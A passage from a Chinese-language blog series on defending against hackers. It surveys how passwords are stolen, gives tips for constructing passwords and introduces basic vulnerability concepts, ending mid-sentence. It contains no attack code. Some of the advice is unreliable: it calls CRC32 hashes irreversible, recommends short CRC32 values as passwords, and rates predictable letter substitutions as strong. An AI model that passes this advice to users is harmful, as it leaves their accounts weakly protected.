title="★使用密码的场合（密码的类型）"></a>★使用密码的场合（密码的类型）</h2><p>　　为了便于后面的叙述，俺有必要先总结一下，使用口令的几种场合。<br>　　针对这几种不同的场合，攻击者会采取不同的攻击手法；因此，大伙儿也要采取针对性的防范手法。</p><h3 id="◇操作系统用户的口令"><a href="#◇操作系统用户的口令" class="headerlink" title="◇操作系统用户的口令"></a>◇操作系统用户的口令</h3><p>　　这种场合应该好理解。目前主流的操作系统都具有口令验证的用户登录机制。</p><h3 id="◇各种网络应用的口令"><a href="#◇各种网络应用的口令" class="headerlink" title="◇各种网络应用的口令"></a>◇各种网络应用的口令</h3><p>　　随着网络（尤其是 Web）的普及，这种场合越来越多。比如：电子邮件（Email）、即时通讯（IM）、论坛（BBS）、上网炒股、等，都需要有用户口令认证。</p><h3 id="◇各种本地应用程序的口令"><a href="#◇各种本地应用程序的口令" class="headerlink" title="◇各种本地应用程序的口令"></a>◇各种本地应用程序的口令</h3><p>　　此种场合可能不如网络应用的口令那么常见。比如：用口令加密的压缩文件、用口令加密的 Office 文档、PGP 密钥的口令、Outlook 设置的启动口令……</p><h3 id="◇其它"><a href="#◇其它" class="headerlink" title="◇其它"></a>◇其它</h3><p>　　除了上述3种类型，其它那些比较少见、杂七杂八的，统统归为其它。比如：BIOS 的开机口令。</p><h2 id="★攻击者如何通过技术手段搞定的你的密码？"><a href="#★攻击者如何通过技术手段搞定的你的密码？" class="headerlink" title="★攻击者如何通过技术手段搞定的你的密码？"></a>★攻击者如何通过技术手段搞定的你的密码？</h2><p>　　前面列举了密码的不同使用场合。接着咱要介绍一下：攻击者会利用哪些技术手段，攻破你的密码。</p><h3 id="◇木马盗取"><a href="#◇木马盗取" class="headerlink" title="◇木马盗取"></a>◇木马盗取</h3><p>　　如果你的电脑已经被攻击者安装了木马，那你的一举一动有可能都会被监视。在这种情况下，你在这台电脑上输入的任何密码，都将会被攻击者获取。所以，这种情况是很危险滴——不管是哪种类型的密码，都可能被盗。<br>　　至于如何防止自己的计算机被植入木马，【不是】本帖的重点。俺会在本系列后续的帖子中专门介绍木马的防范。</p><h3 id="◇弱密码猜解"><a href="#◇弱密码猜解" class="headerlink" title="◇弱密码猜解"></a>◇弱密码猜解</h3><p>　　所谓的“弱密码猜解”，就是说：如果你的密码比较弱，攻击者就容易猜出来。这种攻击手法，对于操作系统用户口令、网络应用口令、本地应用口令，统统适用。<br>　　而且攻击者在盗取口令的时候，通常会先尝试进行弱口令猜测。为啥捏？因为大部分用户都不太具有安全意识，口令都会比较简单（比较弱）。并且，根据【二八原理】，绝大多数的傻瓜用户会使用极少数的弱口令。所以，攻击者先把最流行的那些个弱口令挨个试验一遍，没准就已经成功了。<br>　　为了让大伙明白弱口令的严重程度，来看看2009年底的“<a href="https://www.cnbeta.com/articles/100093.htm">一个案例</a>”。<br>　　话说国外一个小有名气的交友网站（RockYou）被黑客攻破。里面大约3260万用户数据被盗。更加杯具的是，RockYou 采用明文方式存储用户的口令。因此，这3260万用户的口令也统统暴露鸟。后来有好事者把被盗的用户口令拿来分析一番。结果发现，有相当多的用户在使用一些极其弱智的口令。<br>　　用的最多的 TOP 10 分别是：</p><blockquote><p>\1. 123456<br>\2. 12345<br>\3. 123456789<br>\4. password<br>\5. iloveyou<br>\6. princess<br>\7. rockyou<br>\8. 1234567<br>\9. 12345678<br>\10. abc123</p></blockquote><p>　　据说名列第一的口令（123456）有30万人使用，真是不看不知道，一看吓一跳啊！</p><h3 id="◇暴力破解"><a href="#◇暴力破解" class="headerlink" title="◇暴力破解"></a>◇暴力破解</h3><p>　　除了对弱密码进行猜解，攻击者还可以通过穷举的的方式，破解中等强度的密码。所谓的穷举法，就是把所有可能的字母/数字的组合都试验一遍，直到找到正确的密码。<br>　　现在 CPU 的计算能力日新月异，尤其是多核 CPU/GPU 普及之后，暴力破解的效果会越来越好。你的密码必须【很强】，才能彻底消除暴力的风险。<br>　　由于这种攻击手法，需要进行成千上万次的试错，所以比较适合针对本地应用的口令（比如破解加密的压缩文件），而不太适合对网络应用进行在线口令破解。<br>　　在下一个帖子，俺会介绍《如何构造安全的口令/密码》。</p><h3 id="◇网络传输截获（嗅探）"><a href="#◇网络传输截获（嗅探）" class="headerlink" title="◇网络传输截获（嗅探）"></a>◇网络传输截获（嗅探）</h3><p>　　在这种方式下，攻击者会通过【嗅探】的方式，分析你的上网数据。如果你在上网过程中，存在明文传输的口令，就会被截获。<br>　　非安全专业的网友，可能不太明白什么是“嗅探”，俺来稍微解释一下。攻击者会利用某些嗅探软件，收集网络上传输的所有数据。这个过程好比电话窃听。嗅探软件类似于窃听器；你的上网数据类似于电话的通话内容。<br>　　这几年，随着现在无线网络（WiFi）的普及，网络嗅探的风险大大增加，列位看官切不可掉以轻心哦。</p><h3 id="◇客户端截获"><a href="#◇客户端截获" class="headerlink" title="◇客户端截获"></a>◇客户端截获</h3><p>　　所谓“客户端截获”，通常是针对网络应用的口令而言。举几个例子。<br>　　举例1：<br>　　很多网友上网时，为了免去输入口令的麻烦，会让浏览器帮忙记住口令。通常浏览器会把这些口令保存在某个文件中（可能以明文方式，也可能以密文方式）。如果某天你的电脑中了木马，那么木马程序有可能会盗走这个保存口令的文件。然后攻击者就可以通过分析该文件，破解出你保存过的所有网络应用的口令。<br>　　举例2：<br>　　如果你是软件公司的开发人员，多半你会使用某种源代码版本管理工具（比如 SVN、CVS、等）。为了免去每次操作时输入口令的麻烦。通常开发人员会让这些客户端软件记住用户名和口令。如果哪天你中了木马，或者笔记本电脑被盗，那么攻击者同样可以破解你保存下来的口令，进而用你的身份盗取源代码。</p><h3 id="◇服务端截获"><a href="#◇服务端截获" class="headerlink" title="◇服务端截获"></a>◇服务端截获</h3><p>　　和“客户端截获”方式相对的，还有“服务端截获”。具体是啥意思捏？俺来解释一下。<br>　　凡是利用口令进行验证的软件系统，都需要存储和口令相关的信息。否则的话，软件系统就无法验证用户输入的口令。如果攻击者能够拿到这些口令的关联信息，那他/她就有可能分析出口令是啥。<br>　　（如果你不是搞 IT 专业滴，下面这段可能看不太明白。不过没关系，不影响你理解后续章节）<br>　　简而言之，通常有三种方式来存储口令的关联信息：1、存储口令的明文；2、存储口令经过加密后的密文；3、存储口令的散列值。<br>　　第一种方式是最土鳖的，稍微先进一些的系统，都不这么干了。后面两种方式，虽然看不到明文，但是攻击者还是有可能通过某种技术手段，反推出口令的明文。具体细节，本文就不再多说了。<br>　　那攻击者如何获得存储在软件系统的口令关联信息捏？其实前面提到的 RockYou 网站的杯具，就是一个很好的例子。俺再举另一个例子。<br>　　比如说：某个 Linux/Unix 服务器存在安全漏洞，攻击者利用此漏洞搞到了 <code>/etc/shadow</code> 文件。那么攻击者就可以采用上述提到的暴力破解的招数，攻破该服务器上所有强度较弱的口令。</p><h2 id="★攻击者如何通过【非技术】手段搞定的你的密码？"><a href="#★攻击者如何通过【非技术】手段搞定的你的密码？" class="headerlink" title="★攻击者如何通过【非技术】手段搞定的你的密码？"></a>★攻击者如何通过【非技术】手段搞定的你的密码？</h2><p>　　说完了技术手段，自然就得再说说【非】技术手段。所谓的非技术手法，也就是社会工程学手法。用于盗取密码的社会工程学手法，大概有如下几种。</p><h3 id="◇偷窥"><a href="#◇偷窥" class="headerlink" title="◇偷窥"></a>◇偷窥</h3><p>　　偷窥是最简单的一种社会工程学攻击手法。虽然简单，但是有效。比如很多盗取银行卡的家伙，就是偷窥的手法，得到被害人的银行卡密码。</p><h3 id="◇网络钓鱼（phishing）"><a href="#◇网络钓鱼（phishing）" class="headerlink" title="◇网络钓鱼（phishing）"></a>◇网络钓鱼（phishing）</h3><p>　　另外一个骗取口令的方式，就是通过网络钓鱼。比如某些攻击者，会伪造一个银行的网站。其界面和真实的网站一模一样。然后通过某种方式（比如：虚假链接、欺诈邮件、DNS 欺骗 …），引诱你到这个网站上。由于假网站和真网站的界面很像，你可能信以为真，然后在假网站中输入你的用户名和密码。<br>　　有些高明的钓鱼网站，会采用类似Web代理的技巧：把你的所有输入操作，转而提交给真网站；然后把真网站输出的界面，再转回给受害者看。这样的话，受害者就跟在真实网站进行插作，没啥区别，不易看出破绽。<br>　　更多关于网络钓鱼的介绍，可以参见维基百科的“<a href="https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB">这个页面</a>”。</p><h3 id="◇分析"><a href="#◇分析" class="headerlink" title="◇分析"></a>◇分析</h3><p>　　如果攻击者对你比较了解，那么他有可能通过深入的分析，攻破你的口令防护。<br>　　有木有觉得很神奇？很匪夷所思？其实这种招数很常见，且不算太难。俺来举个例子。<br>　　相信很多网友都用过电子邮箱的找回口令功能。当你口令遗忘之后，可以通过回答事先预设的问题，来找回口令。很多不太专业的用户，预设的问题都很简单（比如：你的手机号是多少？比如：你的生日是哪天？）。对于这类过于简单的问题，攻击者可以很容易地找到答案，从而窃取到你的邮箱口令。</p><h3 id="◇欺骗"><a href="#◇欺骗" class="headerlink" title="◇欺骗"></a>◇欺骗</h3><p>　　最近几年，通过电话诈骗，骗取银行卡密码的案例越来越多。这种作案手法，就属于社会工程学中，“欺骗”的范畴。其实在IT领域，某些黑客也会利用这种手法来获取口令。</p><h2 id="★结尾"><a href="#★结尾" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　介绍到这里，列位看官对黑客盗取口令的手法，应该有一个初步的认识了。本系列的下一个帖子，具体介绍如何构造安全的口令/密码。</p><h1 id="如何防止黑客入侵-3-：如何构造安全的口令-密码"><a href="#如何防止黑客入侵-3-：如何构造安全的口令-密码" class="headerlink" title="如何防止黑客入侵[3]：如何构造安全的口令/密码"></a>如何防止黑客入侵[3]：如何构造安全的口令/密码</h1><p><strong>文章目录</strong></p><p>★【不要】共用口令/密码<br>★密码的【分级机制】<br>★一些反面教材——【脆弱】密码的举例<br>★如何构造【复杂】密码？<br>★结尾</p><p>　　在上文，俺介绍了攻击者，是如何攻破口令这道关口的。为了避免口令被轻易地破解，有必要了解构造安全密码的技巧。所以，今天就来介绍此话题。</p><h2 id="★【不要】共用口令-密码"><a href="#★【不要】共用口令-密码" class="headerlink" title="★【不要】共用口令/密码"></a>★【不要】共用口令/密码</h2><p>　　俺发现有相当多的同学喜欢靠一个口令包打天下。这是相当相当危险的事情。同一个口令，用的场合越多，则泄密的危险越大。而一旦泄露，你的安全防线就会全面崩溃。<br>　　所以，今天要讲的头一个要点，就是绝对不要在所有（大多数）场合，使用同一个口令。</p><h2 id="★密码的【分级机制】"><a href="#★密码的【分级机制】" class="headerlink" title="★密码的【分级机制】"></a>★密码的【分级机制】</h2><p>　　由于共用口令存在很大的风险，比较稳妥的办法就是——每一个场合仅使用一个密码。但是很多人会抱怨说：这样会很繁琐，增加了很多的麻烦。那如何才能做到既安全，又不太麻烦捏？这就要引入密码的分级机制。<br>　　根据安全圈内一个人所共知的常识：越安全的措施，通常也就越麻烦，成本也高；反之亦然。另外，根据<a href="https://program-think.blogspot.com/2009/02/80-20-principle-0-overview.html">二八原理</a>，非常重要口令毕竟只占少数。所以，就像电影要有分级机制一样，你的密码/口令也要引入分级的概念。通过分级机制，对大多数不太重要的口令，可以采取简化的安全措施；而对少数重要的口令，采取高度安全的措施。<br>　　下面，就来介绍一下，如何对不同的口令，进行分类。</p><h3 id="◇第1级：不重要的口令"><a href="#◇第1级：不重要的口令" class="headerlink" title="◇第1级：不重要的口令"></a>◇第1级：不重要的口令</h3><p>　　所谓不重要的口令，就是说万一被盗了或者忘记了，对你没啥损失。<br>　　比如，俺经常碰到一些土鳖的论坛，只允许注册会员从上面下载附件。因此俺就经常临时注册一个账号，然后登录上去下载东西。这类账号，基本上都属于一次性的（用完即扔），所以重要程度很低。<br>　　对于那些不重要的口令，基本上不用考虑太多安全性的因素。随便设置一个即可。</p><h3 id="◇第2级：重要但少用的口令"><a href="#◇第2级：重要但少用的口令" class="headerlink" title="◇第2级：重要但少用的口令"></a>◇第2级：重要但少用的口令</h3><p>　　对于重要的口令，还要根据其使用的频繁程度，再区别对待。有些口令虽然重要，但是使用的频度很低。由于这类口令很少使用，所以设置得麻烦一些，问题也不大。<br>　　比如俺管理的一些研发的服务器（比如源代码服务器），其重要程度非常高，但是平常基本无需登录。</p><h3 id="◇第3级：重要且频繁使用的口令"><a href="#◇第3级：重要且频繁使用的口令" class="headerlink" title="◇第3级：重要且频繁使用的口令"></a>◇第3级：重要且频繁使用的口令</h3><p>　　最后这类口令，既重要，又经常用。所以，设置这类口令就比较讲究。要同时兼顾安全性和易用性。<br>　　比如自己日常使用的操作系统用户密码，就属于此类。</p><h2 id="★一些反面教材——【脆弱】密码的举例"><a href="#★一些反面教材——【脆弱】密码的举例" class="headerlink" title="★一些反面教材——【脆弱】密码的举例"></a>★一些反面教材——【脆弱】密码的举例</h2><p>　　说完了分级机制。接下来俺先列举一些反面教材，让大伙儿看看，啥样的口令算是脆弱的？（顺便说一下：2011年底，国内各大网站纷纷被脱库。）</p><h3 id="◇口令和用户名一样"><a href="#◇口令和用户名一样" class="headerlink" title="◇口令和用户名一样"></a>◇口令和用户名一样</h3><p>　　无需多说，这种情形的口令，非常脆弱。</p><h3 id="◇口令是一串简单数字"><a href="#◇口令是一串简单数字" class="headerlink" title="◇口令是一串简单数字"></a>◇口令是一串简单数字</h3><p>　　在上文，俺举了<a href="http://internet.solidot.org/article.pl?sid=09/12/15/114224">RockYou 网站用户数据被盗</a>的案例。在该网站3200万用户中，最受欢迎的十大弱智口令分别是：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span>  123456<br><span class="hljs-bullet">2.</span>  12345<br><span class="hljs-bullet">3.</span>  123456789<br><span class="hljs-bullet">4.</span>  password<br><span class="hljs-bullet">5.</span>  iloveyou<br><span class="hljs-bullet">6.</span>  princess<br><span class="hljs-bullet">7.</span>  rockyou<br><span class="hljs-bullet">8.</span>  1234567<br><span class="hljs-bullet">9.</span>  12345678<br><span class="hljs-bullet">10.</span> abc123<br></code></pre></td></tr></table></figure><p>　　从这个 TOP 10 可以看出，有一半是采用连续数字。所以，用连续的数字串（包括顺序和逆序）作密码，也是很愚昧滴。</p><h3 id="◇口令太短"><a href="#◇口令太短" class="headerlink" title="◇口令太短"></a>◇口令太短</h3><p>　　如果你的口令小于6个字符，是很容易被暴力破解滴。毕竟，小于6个字符的所有组合，也没多少个。对专门穷举密码程序来说，那简直是小菜一碟。</p><h3 id="◇用英文单词作口令"><a href="#◇用英文单词作口令" class="headerlink" title="◇用英文单词作口令"></a>◇用英文单词作口令</h3><p>　　用【单个】英文单词作口令，也很容易被破解。毕竟，常用的英文单词，也就千把个；算上冷僻的，也就几万个。<br>　　在许多年以前，就有黑客专门收集整理了英文单词的列表（称之为“口令字典”）。而且这个字典是根据单词的使用频度进行排序。有了这种密码破解字典，密码破解程序就可以轻易猜解出那些使用单个英文单词的密码。</p><h3 id="◇用日期作口令"><a href="#◇用日期作口令" class="headerlink" title="◇用日期作口令"></a>◇用日期作口令</h3><p>　　有些同学希望用某个具有特殊意义的日期（比如：生日、结婚纪念日…）作为口令。要知道这种伎俩也是不灵滴。因为常见的日期，大都分布在最近100年的范围内。所以充其量，可能的个数也就大约是365*100个。即便把不同的日期表示格式考虑进去，也多不了几倍。在这个数量级上，对于暴力破解工具而言，还是小菜一碟。</p><h3 id="◇其它的烂口令"><a href="#◇其它的烂口令" class="headerlink" title="◇其它的烂口令"></a>◇其它的烂口令</h3><p>　　上述列举的这几种情况，大伙儿一定要避免。另外，你还可以去围观一下某老外整理的一个<a href="http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time">滥口令大全</a>（这老外真有耐心）。提醒一下：这个列表是根据欧美用户统计的，未必适合中国的国情。</p><h2 id="★如何构造【复杂】密码？"><a href="#★如何构造【复杂】密码？" class="headerlink" title="★如何构造【复杂】密码？"></a>★如何构造【复杂】密码？</h2><p>　　前面已经说了：口令太简单，容易被破解。但是太复杂的话，万一自己也忘了，那可就完蛋了。所以，很多网友都纠结于口令到底该复杂到什么程度。俺的经验是：<strong>口令要做到对自己简单，对别人复杂。</strong><br>　　下面就来介绍俺在这方面的经验。</p><h3 id="◇用多个单词构成词组"><a href="#◇用多个单词构成词组" class="headerlink" title="◇用多个单词构成词组"></a>◇用多个单词构成词组</h3><p>　　前面提到，如果用【单个】英文单词作密码，容易遭受字典攻击。为了避免字典攻击，可以考虑由2<del>5个英文单词构成密码。如果你英语不灵光或你比较习惯中文，也可以考虑用2</del>5个汉字的拼音来构成密码。</p><p><strong>优点</strong><br>　　由于能显著增加密码长度，可以抗击暴力破解。<br><strong>缺点</strong><br>　　有可能需要改变你记忆密码的习惯。<br>　　口令中仅包含字母，复杂度不够高。</p><h3 id="◇插入特殊字符"><a href="#◇插入特殊字符" class="headerlink" title="◇插入特殊字符"></a>◇插入特殊字符</h3><p>　　刚才提到了用多个单词或汉字拼音构造密码。为了让密码的强度再好一些，还可以在单词或汉字拼音之间，插入一些特殊字符。<br>　　最常见的是插入空格。当然，你也可以考虑插入其它字符（比如：下划线、减号、斜杠、井号、星号、等）。<br>　　通常进行暴力破解时，为了加快破解进度，都只针对字母和数字进行暴力破解。如果你的口令中含有特殊字符，会大大提高攻击者的难度。</p><p><strong>优点</strong><br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　很多特殊字符的输入，要依赖于 SHIFT 键辅助。对于键盘指法不流畅的同学，可能会影响你输入密码时的击键速度，给偷窥者留下可乘之机。</p><h3 id="◇字符变换"><a href="#◇字符变换" class="headerlink" title="◇字符变换"></a>◇字符变换</h3><p>　　所谓的字符变换，就是用形状类似的字母和数字进行相互替换，通过这种变换，可以规避前面提到的基于口令字典的攻击。<br>　　常见的变换有如下几种：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">字母o 和 数字<span class="hljs-number">0</span><br>字母l 和 数字<span class="hljs-number">1</span><br>字母z 和 数字<span class="hljs-number">2</span><br>字母s 和 符号$<br>字母g 和 数字<span class="hljs-number">9</span><br>字母<span class="hljs-selector-tag">q</span> 和 数字<span class="hljs-number">9</span><br>字母<span class="hljs-selector-tag">a</span> 和 符号@<br>字母<span class="hljs-selector-tag">b</span> 和 数字<span class="hljs-number">6</span><br>字母x 和 符号*<br></code></pre></td></tr></table></figure><p>　　假设俺想用单词 <code>program</code> 作为口令，那么经过上述的变换之后，就成为 <code>pr09r@m</code><br>　　很明显，变换之后的口令同时具有字母、数字、符号。强度相当好 :)<br>　　以上变换仅仅是举例。你可以对俺给出的这几个变换，进行扩展，以满足自己的习惯与偏好。</p><p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　如果你想好的口令中，恰巧所有字母都没有对应的变换，那就比较不爽啦。</p><h3 id="◇键位平移"><a href="#◇键位平移" class="headerlink" title="◇键位平移"></a>◇键位平移</h3><p>　　这个招数也比较简单，就是在进行键盘输入时，把手【向右】平移一个键位。通常咱们在盲打时，两只手的食指分别对着字母 <code>F</code> 和字母 <code>J</code>。平移之后，则食指对着 <code>G</code> 和 <code>K</code>。<br>　　假设俺想用单词 <code>program</code> 作为口令，那么经过上述的变换之后，就成为 <code>[tphts</code><br>　　经过这种输入法，口令已经面目全非。但是对你自己来说，并不难记。</p><p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　口令看起来完全没规律。<br><strong>缺点</strong><br>　　依赖于 QWERT 的键盘布局。万一哪天你想在非 QWERT 键盘（比如某些手机键盘）上输入口令，那你就歇菜了。</p><h3 id="◇藏头诗"><a href="#◇藏头诗" class="headerlink" title="◇藏头诗"></a>◇藏头诗</h3><p>　　在某些古代小说的情节中，经常可以看见藏头诗的桥段。藏头诗的点子，也可以借用来构造安全口令。<br>　　为了用此招数，你先要想好一句令你印象深刻的话。这话可以是中文，也可以是英文、法文、火星文……反正只要是你熟悉的语言既可。最好这句话的字数（单词数）在8~20之间。然后你把这句话每一个单词的头一个字母取出来，组合成一个口令。如果是中文的话，就把每一个字的拼音的声母取出，组合成口令。<br>　　假设俺想好的话是：“只有偏执狂才能生存”。那么用拼音的声母表示就成为 <code>zypzkcnsc</code></p><p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　口令看起来完全没规律。<br><strong>缺点</strong><br>　　口令中仅包含字母，复杂度不够高。<br>　　如果句子中的字数（单词数）不够多，效果就不够好。<br>　　对于港台的同学，由于没学过汉语拼音，只好用英文的藏头诗了。好在港台的英语教育通常比大陆好，应该关系不大 :-)</p><h3 id="◇巧用-SHIFT-键"><a href="#◇巧用-SHIFT-键" class="headerlink" title="◇巧用 SHIFT 键"></a>◇巧用 SHIFT 键</h3><p>　　在构造口令的时候，适当地组合一下 SHIFT 键，有时也可以达到不错的效果。假如你的口令中，有部分字符是数字，那当你输入口令时，按住SHIFT键会让这些数字字符变为特殊符号。</p><p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　万一你原先的口令仅有字母，没有数字，则密码的强度会稍微打折扣。<br>　　由于要依赖于 SHIFT 键进行切换，会影响你输入密码的击键速度。这会给偷窥者留下可乘之机。</p><h3 id="◇运用数学等式"><a href="#◇运用数学等式" class="headerlink" title="◇运用数学等式"></a>◇运用数学等式</h3><p>　　还有一种又好记，看起来又复杂的密码构造方式——运用数学等式。<br>　　比如，可以把密码设计成：<code>7+8=15</code><br>　　虽然只有6个字符，但是由于包含了符号，已经有一定的强度。如果你觉得6字符太少，可以很容易增加字符数及复杂度，比如改为：<code>37+(9*2)=55</code><br>　　如果你觉得还不够复杂，还可以搞得再变态一点——把某个数用英文表示。比如：<code>two+7=nine</code></p><p><strong>优点</strong><br>　　密码同时包含了字母、数字、符号。标准的高复杂度！<br><strong>缺点</strong><br>　　需要改变你记忆密码的习惯。<br>　　一旦你的口令被别人看到，别人很容易就可以发现你构造口令的规律。</p><h3 id="◇利用散列值（哈希函数）"><a href="#◇利用散列值（哈希函数）" class="headerlink" title="◇利用散列值（哈希函数）"></a>◇利用散列值（哈希函数）</h3><p>　　最后，来说一种俺的看家本领——利用散列值构造口令。<br>　　要构造基于散列值的密码，有好几种散列算法可供选择。对于不太懂技术的网友，俺建议用 CRC32 散列算法。为啥用它捏？因为这玩意儿操作起来比较方便。比如，假设俺想得到某个文件的 CRC32 散列值，只要用 7-Zip、WinRAR 之类的压缩工具，把它压缩成 zip 格式的文件，然后就可以看到该文件的 CRC32 值了（因为 zip 格式用 CRC32 散列算法作为文件的校验码）。不信你随便拿手头一个 zip 格式的文件打开来看看就明白鸟。<br>　　因为 CRC32 生成的散列值比较【短】，对于懂技术并且安全要求较高的网友，可以用散列值【更长】的散列算法（比如：MD5、SHA1、SHA256 ……）。<br>　　现在，详细说一下基于散列值的密码如何构造（以 CRC32 为例，其它散列算法依样画葫芦）<br>　　首先，你先想好一个字符串，作为计算散列的种子。这个字符串不需要很复杂，也不需要很长。比方说你叫张三，那你可以拿张三的拼音声母 <code>zs</code> 作为【种子串】（注：此处纯属举例，实际情况中，你应该用【更长】的字符串作为种子串）。<br>　　接下来，假设你有一个 hotmal 的邮箱，需要设置口令。你可以先用记事本（notepad）生成一个 txt 文件。里面先写上种子串 <code>zs</code> 再写上 <code>hotmail</code>，存盘。然后把这个 txt 文件用工具压缩成 zip 格式，看一下它的 CRC32 校验码 <code>9C9041C0</code>，然后就拿它作为密码。<br>　　如果你再有一个 gmail 邮箱需要设置口令，只要同样地，新建一个 txt 文件并写入 <code>zsgmail</code>，同样计算 CRC32，就可以得到另外一个值 <code>03B2F77D</code>。大伙注意到没有？这两个值看起来没有任何关联性，而且从这两个口令，也看不出和种子串 <code>zs</code> 有啥关系。</p><p><strong>优点</strong><br>　　密码同时包含了字母、数字，但是没有特殊符号。复杂度属于中高！<br>　　由于散列值具有随机性。也就是说，你看到的绝大多数散列值都没啥规律。<br>　　由于散列值具有不可逆性。也就是说，即便有一个密码暴露了，攻击者也看不出规律。<br>　　即使有一个密码暴露，别人完全看不出规律。<br><strong>缺点</strong><br>　　这种密码是完全随机的，常人是【不可能记住】滴。所以，在密码分级机制中，它仅适合第二级的密码。第三类密码没法这么玩。</p><p>　　此招数的进阶：<br>　　1. 你可以把 CRC 算法换成其它散列算法（比如： MD5、SHA1、SHA256 ……），就可以轻易构造出【超长的】密码或口令（几十个字符，甚至上百个字符）。<br>　　2. 如果你自己会写点小程序或小脚本，你可以进行 N 次散列（N 可以是几千或几万）。这样一来，别人拿到你的某个密码后，更加难逆向分析出你的“种子串”。因此也就无法分析出由种子串构造出来的其它密码。</p><h2 id="★结尾-1"><a href="#★结尾-1" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　今天又花了不少篇幅，总算把俺平生积累的，关于如何构造复杂密码的经验，都讲完了。如果哪个网友还有其它独到的经验，希望来信和俺分享。如果俺觉得实用，也会补充到本文中。<br>　　本系列的下一个帖子，会说说安全漏洞的基本防范。</p><h1 id="如何防止黑客入侵-4-：安全漏洞的基本防范"><a href="#如何防止黑客入侵-4-：安全漏洞的基本防范" class="headerlink" title="如何防止黑客入侵[4]：安全漏洞的基本防范"></a>如何防止黑客入侵[4]：安全漏洞的基本防范</h1><p><strong>文章目录</strong></p><p>★扫盲基本概念<br>★安全漏洞的分类<br>★漏洞的防范措施</p><p>　　前面用2个帖子来介绍口令方面的安全（在“<a href="https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-2.html">这里</a>”和“<a href="https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-3.html">这里</a>”）。今天扫盲一下跟安全漏洞相关的知识，为下一篇（Web 相关的防范）做好铺垫。考虑到俺博客的读者群，本文主要拿Windows桌面系统来举例，并且尽量说得浅显一点。</p><h2 id="★扫盲基本概念"><a href="#★扫盲基本概念" class="headerlink" title="★扫盲基本概念"></a>★扫盲基本概念</h2><h3 id="◇什么是漏洞？"><a href="#◇什么是漏洞？" class="headerlink" title="◇什么是漏洞？"></a>◇什么是漏洞？</h3><p>　　所谓的“漏洞”，简单来说，就是会引起各种问题的软硬件缺陷（软件业的行话叫 Bug）。要知道，任何东西都不可能是完美的，软硬件系统也不例外（毕竟开发软硬件系统的程序员/工程师，也是凡人，也会有出错的时候）。</p><h3 id="◇什么是安全漏洞？"><a href="#◇什么是安全漏洞？" class="headerlink" title="◇什么是安全漏洞？"></a>◇什么是安全漏洞？</h3><p>　　在上述提到的缺陷中，那些会被攻击者加以利用的，并因此导致安全问题的缺陷，就是所谓的“安全漏洞”。</p><h3 id="◇什么是补丁？"><a href="#◇什么是补丁？" class="headerlink" title="◇什么是补丁？"></a>◇什么是补丁？</h3><p>　　补丁是一个很形象的说法。如果你衣服破了个洞，只要打个补丁，不需要把整件衣服换掉。同样的，如果你的某个软件有漏洞，也只要打一个补丁，不需要重新安装新版本的软件。大多数情况下，补丁和漏洞是配套的。</p><h3 id="◇什么是攻击代码-攻击程序？"><a href="#◇什么是攻击代码-攻击程序？" class="headerlink" title="◇什么是攻击代码 / 攻击程序？"></a>◇什么是攻击代码 / 攻击程序？</h3><p>　　为了利用某个安全漏洞，黑客需要运行某个程序，这个程序就叫做攻击程序（也叫“攻击代码”）。通俗地说，攻击程序和补丁之间的关系，就好比矛和盾之间的关系。</p><h2 id="★安全漏洞的分类"><a href="#★安全漏洞的分类" class="headerlink" title="★安全漏洞的分类"></a>★安全漏洞的分类</h2><p>　　除了上述的基本概念，你还需要大致知道安全漏洞的分类方式。</p><h3 id="◇按照所在软件的类型分类"><a href="#◇按照所在软件的类型分类" class="headerlink" title="◇按照所在软件的类型分类"></a>◇按照所在软件的类型分类</h3><p>　　根据出现漏洞的软件的类型，可以把漏洞分为“操作系统漏洞”、“应用软件漏洞”、“Web 漏洞”等。<br>　　所谓的“操作系统漏洞”，就是操作系统本身有的安全缺陷。<br>　　所谓的“应用软件漏洞”，就是你安装的软件所内含的安全缺陷。<br>　　近几年来，基于 Web 的攻击日益增多，所以把 Web 漏洞单独分一类。所谓的“Web 漏洞”，也就是跟Web相关的漏洞——包括了浏览器本身的漏洞和网站的漏洞（本系列的下一篇会具体介绍这方面的知识）。</p><h3 id="◇按照危险级别分类"><a href="#◇按照危险级别分类" class="headerlink" title="◇按照危险级别分类"></a>◇按照危险级别分类</h3><p>　　还可以根据漏洞的危险程度，进行分类。通常按照“高中低”分三级（也有把危险级别定为5级的）。级别越高，就越危险。<br>　　对于高危的漏洞，有可能导致攻击者在你的电脑上植入木马。</p><h3 id="◇按照攻击代码的位置分类"><a href="#◇按照攻击代码的位置分类" class="headerlink" title="◇按照攻击代码的位置分类"></a>◇按照攻击代码的位置分类</h3><p>　　针对攻击代码所处的位置，可以把漏洞分为“远程漏洞”、“本地漏洞”两类。<br>　　所谓的“远程漏洞”，就是说，攻击者只需要在另外一台机器运行攻击代码，就可以让你的电脑中招。<br>　　所谓的“本地漏洞”，就是攻击者的攻击代码必须在你的机器上执行。</p><h3 id="◇按照补丁的情况分类"><a href="#◇按照补丁的情况分类" class="headerlink" title="◇按照补丁的情况分类"></a>◇按照补丁的情况分类</h3><p>　　刚才已经解释过了“补丁”和“漏洞”之间的关系。<br>　　